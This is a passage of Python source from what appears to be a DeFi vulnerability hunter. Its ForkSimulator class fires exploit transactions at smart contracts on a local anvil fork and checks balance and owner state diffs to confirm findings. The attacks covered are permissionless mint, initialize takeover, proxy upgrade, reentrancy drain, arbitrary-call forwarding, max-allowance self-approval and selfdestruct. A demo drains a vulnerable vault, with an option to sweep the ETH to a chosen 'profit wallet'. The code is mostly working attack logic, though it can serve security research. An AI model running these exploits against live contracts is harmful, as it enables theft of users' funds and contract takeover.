        self._abi = abi or []
        self._attack_candidates = self._abi_candidates(attack)
        res = self._run_impl(attack, target, source_finding)
        if res.get("success"):
            res["verdict"] = "CONFIRMED"
        elif res.get("verdict"):  # already set inside (e.g. no code on fork)
            pass
        elif not self.available:
            res["verdict"] = "UNVERIFIED"
        elif self._attack_candidates:
            res["verdict"] = "REFUTED"
        else:
            res["verdict"] = "UNVERIFIED"
        return res

    def offline_demo(self, profit_wallet: Optional[str] = None) -> Dict:
        """End-to-end offline self-test: deploy the vulnerable SimpleVault demo
        on a blank anvil chain, then prove a reentrancy drain against it.

        This is the CI-safe version of prove_reentrancy — it never touches a
        mainnet RPC. Verdict should be CONFIRMED when the whole machinery
        (compiler → deploy → seed → drain chain → state diff) works.

        profit_wallet: optional address the drained ETH is swept to (defaults
        to the attacker EOA). Pass a custom wallet to show the drain landing
        in the caller's own address.
        """
        if not self.available:
            return {"success": False, "verdict": "UNVERIFIED",
                    "error": self.why_not, "attack": "reentrancy", "demo": True}
        from defihunter.core import attacker
        art = attacker.get_contract("SimpleVault")
        if not art.get("bytecode"):
            return {"success": False, "verdict": "UNVERIFIED",
                    "error": "SimpleVault demo compile unavailable (solc not found)",
                    "attack": "reentrancy", "demo": True}
        dep = self._deploy(art["bytecode"])
        if not dep.get("ok"):
            return {"success": False, "verdict": "UNVERIFIED",
                    "error": f"demo deploy failed: {dep.get('stderr', '')[:150]}",
                    "attack": "reentrancy", "demo": True}
        return self.prove_reentrancy(dep["address"], "withdraw(uint256)", "1",
                                     demo=True, profit_wallet=profit_wallet)

    def _run_impl(self, attack: str, target: str, source_finding: Optional[Dict] = None) -> Dict:
        """Prove the finding on a real anvil fork.

        mint / initialize / approve / reentrancy get the full state-diff
        proof: the attacker is funded on the fork, the tx actually executes,
        and the resulting state (balanceOf / owner / allowance / ETH moved)
        is read back as evidence. CONFIRMED requires that state to have
        CHANGED — a mined tx that moved nothing (empty calldata hitting a
        payable fallback, a by-design self-withdraw of a zero balance) is
        a no-op, REFUTED. delegatecall is proven via eth_call (an actual
        upgrade would clobber fork state for later checks).
        """
        if not self.available:
            return {"success": False, "error": self.why_not, "attack": attack,
                    "target": target, "source_finding": source_finding}
        self._target = target
        steps: List[Dict] = []

        if not self._has_code():
            # No bytecode at the target on this fork: the address does not
            # exist on this network (devnet-only deploy, placeholder, EOA).
            # Any tx/call would mine vacuously — NOT evidence of exploitability.
            return {"success": False, "attack": attack, "target": target,
                    "verdict": "REFUTED",
                    "steps": [{"step": "code check",
                               "value": "no code at address on this fork"}],
                    "evidence": ("target has no bytecode on this fork "
                                 "(not a live contract on this network)"),
                    "source_finding": source_finding}

        if attack == "mint":
            # state-diff: read attacker balance BEFORE the tx, then after
            br0 = self._call("balanceOf(address)", [self.attacker], extra_from=False)
            before = self._to_int(br0["stdout"])
            tried = []
            for sel, args in self._merge_candidates(
                    [("mint(address,uint256)", [self.attacker, "1000000"])]):
                r = self._send(sel, args)
                tried.append(f"{sel}: {'mined' if r['ok'] else 'reverted'}")
                if r["ok"]:
                    br = self._call("balanceOf(address)", [self.attacker], extra_from=False)
                    bal = self._to_int(br["stdout"])
                    steps.append({"step": sel + " sent from arbitrary account",
                                  "value": "tx mined ✅"})
                    if before is not None and bal is not None and bal != before:
                        steps.append({"step": f"balanceOf({self.attacker[:10]}…) before → after",
                                      "value": f"{before} → {bal}"})
                        return {"success": True, "attack": attack, "target": target,
                                "profit": "Unlimited token supply minted for free",
                                "steps": steps,
                                "evidence": f"balanceOf(attacker) {before} → {bal}",
                                "source_finding": source_finding}
                    steps.append({"step": "balanceOf(attacker) before → after",
                                  "value": f"{before or 'read failed'} → "
                                           f"{bal or 'read failed'} — NO CHANGE, no-op"})
            steps.append({"step": "mint selectors tried", "value": "; ".join(tried)})
            return {"success": False, "attack": attack, "target": target,
                    "steps": steps,
                    "evidence": ("No permissionless mint that credits the caller found "
                                 "(all mint() variants reverted or mined without "
                                 "changing balanceOf)."),
                    "source_finding": source_finding,
                    **({"verdict": "REFUTED"} if any("mined" in t for t in tried) else {})}

        if attack == "initialize":
            owner_before = self._read("owner()")
            tried = []
            for sel, args in self._merge_candidates(
                    [("initialize(address)", [self.attacker]),
                     ("initialize()", [])]):
                r = self._send(sel, args)
                tried.append(f"{sel}: {'mined' if r['ok'] else 'reverted'}")
                if r["ok"]:
                    owner = self._read("owner()")
                    norm = lambda h: h.lower().replace("0x", "").lstrip("0")
                    owned = norm(owner) == norm(self.attacker)
                    steps.append({"step": sel + " sent from arbitrary account",
                                  "value": "tx mined"})
                    if owned:
                        steps.append({"step": "owner() before → after",
                                      "value": f"{owner_before or 'n/a'} → {owner} — attacker IS owner"})
                        return {"success": True, "attack": attack, "target": target,
                                "profit": "Full contract takeover (first-caller becomes owner)",
                                "steps": steps,
                                "evidence": (f"owner() {owner_before or 'n/a'} → {owner} "
                                             f"(attacker IS owner)"),
                                "source_finding": source_finding}
                    steps.append({"step": "owner() before → after",
                                  "value": f"{owner_before or 'n/a'} → {owner or 'read failed'} "
                                           f"— NOT the attacker, no takeover"})
            steps.append({"step": "initialize() attempts", "value": "; ".join(tried)})
            return {"success": False, "attack": attack, "target": target,
                    "steps": steps,
                    "evidence": ("initialize() not exploitable: all variants reverted "
                                 "(guarded/already initialized) or did not grant the "
                                 "attacker ownership."),
                    "source_finding": source_finding,
                    **({"verdict": "REFUTED"} if any("mined" in t for t in tried) else {})}

        if attack == "delegatecall":
            # Permissionless proxy upgrade = arbitrary delegatecall.
            # eth_call only: an actual upgradeTo would replace the fork's
            # implementation and invalidate every subsequent check.
            dummy = "0x2222222222222222222222222222222222222222"
            tried = []
            for sel, args in self._merge_candidates(
                    [("upgradeTo(address)", [dummy]),
                     ("setImplementation(address)", [dummy]),
                     ("setTarget(address)", [dummy])]):
                r = self._call(sel, args)
                tried.append(f"{sel}: {'returned' if r['ok'] else 'reverted'}")
                if r["ok"]:
                    steps.append({"step": sel + " from arbitrary account",
                                  "value": "returned — proxy upgradeable by anyone"})
                    return {"success": True, "attack": attack, "target": target,
                            "profit": "Full proxy storage/balance takeover via delegatecall",
                            "steps": steps, "evidence": sel,
                            "source_finding": source_finding}
            steps.append({"step": "proxy-upgrade selectors", "value": "; ".join(tried)})
            return {"success": False, "attack": attack, "target": target,
                    "steps": steps,
                    "evidence": "No permissionless proxy-upgrade selector found.",
                    "source_finding": source_finding,
                    **({"verdict": "REFUTED"} if any("returned" in t for t in tried) else {})}

        if attack == "reentrancy":
            # A payout sink callable by anyone = an open reentrancy window
            # (The DAO 2016 pattern): ETH leaves the contract before state
            # settles, so a callback can re-enter and double-withdraw.
            #
            # CONFIRMED only on a REAL state change: the target's ETH
            # balance drops (money actually left the contract) or the
            # attacker's ETH balance exceeds the 2 ETH seed (a payout
            # landed, net of gas). _send re-funds the attacker to exactly
            # 2 ETH each call, so > 2e18 is a self-baselining payout signal.
            # A mined tx with no balance movement (e.g. an empty withdraw()
            # landing in a payable fallback that does nothing — WETH) is a
            # no-op and is REFUTED, NOT a payout sink.
            fund_seed = 2 * 10 ** 18  # matches _fund_attacker's 2 ETH
            tried = []
            for sel, args in self._merge_candidates(
                    [("withdraw(uint256)", ["1000"]),
                     ("withdraw()", []),
                     ("claim()", []),
                     ("redeem()", []),
                     ("unstake()", []),
                     ("harvest()", []),
                     ("withdrawAll()", []),
                     ("emergencyWithdraw()", [])]):
                target_before = self._to_int(self._balance(self._target))
                r = self._send(sel, args)
                tried.append(f"{sel}: {'mined' if r['ok'] else 'reverted'}")
                if not r["ok"]:
                    continue
                target_after = self._to_int(self._balance(self._target))
                attacker_after = self._to_int(self._balance(self.attacker))
                moved = (target_before is not None and target_after is not None
                         and target_after < target_before)
                payout = attacker_after is not None and attacker_after > fund_seed
                if moved or payout:
                    steps.append({"step": sel + " sent from arbitrary account",
                                  "value": "mined — payout sink callable by anyone"})
                    steps.append({"step": "target ETH before → after",
                                  "value": f"{target_before} → {target_after}"})
                    steps.append({"step": "attacker ETH after",
                                  "value": f"{attacker_after} (payout {'received' if payout else 'n/a'})"})
                    return {"success": True, "attack": attack, "target": target,
                            "profit": "Reentrancy window: payout sends ETH before state settles",
                            "steps": steps,
                            "evidence": (f"{sel} mined and moved ETH: target "
                                         f"{target_before} → {target_after}, "
                                         f"attacker {attacker_after}"),
                            "source_finding": source_finding}
                steps.append({"step": sel + " mined but no state change",
                              "value": ("no ETH moved — no-op / payable fallback hit, "
                                        "NOT a payout sink")})
            steps.append({"step": "payout selectors", "value": "; ".join(tried)})
            return {"success": False, "attack": attack, "target": target,
                    "steps": steps,
                    "evidence": ("No permissionless payout sink found "
                                 "(withdraw/claim/redeem/unstake/harvest mined "
                                 "without moving ETH)."),
                    "source_finding": source_finding,
                    **({"verdict": "REFUTED"} if any("mined" in t for t in tried) else {})}

        if attack == "arbitrarycall":
            # A forwarder callable by anyone with attacker-supplied calldata =
            # the arbitrary-exec primitive behind governance takeovers and
            # token drains (Parity 2017 lineage). eth_call only: executing
            # attacker calldata would clobber fork state for later checks.
            payload = "0x" + "00" * 4  # benign no-op calldata for the callee
            tried = []
            for sel, args in self._merge_candidates(
                    [("execute(address,bytes)", [self.attacker, payload]),
                     ("call(address,bytes)", [self.attacker, payload]),
                     ("exec(address,bytes)", [self.attacker, payload]),
                     ("performAction(address,bytes)", [self.attacker, payload]),
                     ("execute(address,uint256,bytes)", [self.attacker, "0", payload]),
                     ("governanceCall(address,bytes)", [self.attacker, payload])]):
                r = self._call(sel, args)
                tried.append(f"{sel}: {'returned' if r['ok'] else 'reverted'}")
                if r["ok"]:
                    steps.append({"step": sel + " from arbitrary account",
                                  "value": "returned — attacker calldata forwarded"})
                    return {"success": True, "attack": attack, "target": target,
                            "profit": ("Arbitrary external call with attacker-controlled "
                                       "calldata (token drain / governance takeover)"),
                            "steps": steps, "evidence": sel,
                            "source_finding": source_finding}
            steps.append({"step": "forwarder selectors", "value": "; ".join(tried)})
            return {"success": False, "attack": attack, "target": target,
                    "steps": steps,
                    "evidence": "No permissionless calldata forwarder found.",
                    "source_finding": source_finding,
                    **({"verdict": "REFUTED"} if any("returned" in t for t in tried) else {})}

        if attack == "approve":
            # Attacker granting itself spending allowance over the target =
            # the primitive behind ERC20 drains: once allowance
            # (target → attacker) > 0, transferFrom can move the target's
            # entire balance in one tx.
            # CONFIRMED only when the mined tx actually granted an
            # allowance/isApprovedForAll — a mined no-op (approve() landing
            # in a payable fallback) that leaves allowance at 0 is REFUTED.
            max_allow = "115792089237316195423570985008687907853269984665640564039457584007913129639935"
            tried = []
            for sel, args in self._merge_candidates(
                    [("approve(address,uint256)", [self.attacker, max_allow]),
                     ("setApprovalForAll(address,bool)", [self.attacker, "true"])]):
                r = self._send(sel, args)
                tried.append(f"{sel}: {'mined' if r['ok'] else 'reverted'}")
                if not r["ok"]:
                    continue
                if "setApprovalForAll" in sel:
                    chk = self._call("isApprovedForAll(address,address)",
                                     [self._target, self.attacker], extra_from=False)
                    granted = chk["ok"] and chk["stdout"].strip().lower() in ("true", "0x01", "1")
                    label = "isApprovedForAll(target→attacker)"
                else:
                    chk = self._call("allowance(address,address)",
                                     [self._target, self.attacker], extra_from=False)
                    granted = (self._to_int(chk["stdout"]) or 0) > 0
                    label = "allowance(target→attacker)"
                steps.append({"step": sel + " from arbitrary account",
                              "value": "mined"})
                steps.append({"step": f"{label} after",
                              "value": chk["stdout"] or "read failed"})
                if granted:
                    return {"success": True, "attack": attack, "target": target,
                            "profit": "Attacker granted itself spending allowance over the target",
                            "steps": steps,
                            "evidence": "allowance(target→attacker) > 0",
                            "source_finding": source_finding}
                steps.append({"step": f"{label} still 0",
                              "value": "mined but no approval granted — no-op"})
            steps.append({"step": "approval selectors", "value": "; ".join(tried)})
            return {"success": False, "attack": attack, "target": target,
                    "steps": steps,
                    "evidence": ("No permissionless approve()/setApprovalForAll() found "
                                 "(all reverted or mined without granting an allowance)."),
                    "source_finding": source_finding,
                    **({"verdict": "REFUTED"} if any("mined" in t for t in tried) else {})}

        if attack == "selfdestruct":
            before = self._balance(self._target)
            tried = []
            for sel, args in self._merge_candidates(
                    [("selfdestruct()", []),
                     ("kill()", []),
                     ("destroy()", []),
                     ("die()", []),
                     ("kill(address)", [self.attacker]),
                     ("destroy(address)", [self.attacker]),
                     ("selfdestruct(address)", [self.attacker])]):
                r = self._send(sel, args)
                tried.append(f"{sel}: {'mined' if r['ok'] else 'reverted'}")
                if r["ok"]:
                    gone = not self._has_code()
                    after = self._balance(self._target)
                    state_changed = gone or after != before
                    steps.append({"step": sel + " from arbitrary account",
                                  "value": "mined ✅"})
                    if state_changed:
                        steps.append({"step": "code after",
                                      "value": ("removed" if gone else
                                                "still present (EIP-6780: balance transferred)" )})
                        steps.append({"step": "target ETH before → after",
                                      "value": f"{before} → {after}"})
                        return {"success": True, "attack": attack, "target": target,
                                "profit": "Kill switch: contract balance transferred / code destroyed",
                                "steps": steps,
                                "evidence": f"{sel} mined — ETH {before} → {after}",
                                "source_finding": source_finding}
                    steps.append({"step": sel + " mined but no state change",
                                  "value": "code present, ETH unchanged — no-op, NOT a kill switch"})
            steps.append({"step": "kill selectors", "value": "; ".join(tried)})
            return {"success": False, "attack": attack, "target": target,
                    "steps": steps,
                    "evidence": "No permissionless selfdestruct/kill selector found.",
                    "source_finding": source_finding,
                    **({"verdict": "REFUTED"} if any("mined" in t for t in tried) else {})}

        return {"success": False, "attack": attack, "target": target,
                "error": f"ForkSimulator does not support attack '{attack}'",
                "source_finding": source_finding}

    def __exit__(self, exc_type, exc, tb) -> None:
        if self.proc is not None:
            self.proc.terminate()
            try:
                self.proc.wait(timeout=5)
            except Exception:
                self.proc.kill()
            self.proc = None
